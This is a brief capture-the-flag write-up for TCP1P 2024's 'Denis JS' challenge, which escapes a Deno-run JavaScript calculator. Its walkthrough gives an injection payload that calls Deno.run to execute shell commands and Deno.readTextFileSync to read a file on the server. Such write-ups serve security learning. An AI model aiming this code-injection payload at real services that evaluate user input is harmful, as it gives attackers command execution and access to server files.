# Denis JS (old)

## Metadata

- Event: TCP1P 2024
- Category: Misc
- Difficulty: Unknown
- Status: Solved
- Files: [dist/app.ts](dist/app.ts), [dist/Dockerfile](dist/Dockerfile), [dist/docker-compose.yml](dist/docker-compose.yml)
- Skills Learned: JavaScript runtime inspection, Deno API abuse, remote service interaction

## Problem Summary

Author: Dimas & ayapi

Hello guys, Denis just make a simple calculator in js, can you try it?

## What I Tried

The service behaves like a JavaScript calculator. Because it runs on Deno, the important question is whether the sandbox allows access to process or filesystem APIs.

## Key Idea

Use exposed Deno functionality to execute commands and read the flag file.

## Solution Walkthrough

```nc ctf.tcp1p.team <Port>```

```js
Deno["run"]({ cmd: ["ls", "-la", "/"], stdout: "piped" }).output().then(output => { console.log(new TextDecoder().decode(output));});


console.log(Deno.readTextFileSync("/flag-af9bc2b0e080a36f66549ba2d790529e"));
```

## Flag

Not recorded in the current notes.

## Lessons Learned

- In JavaScript sandbox challenges, identify the runtime first.
- Runtime-specific APIs can matter more than language syntax.
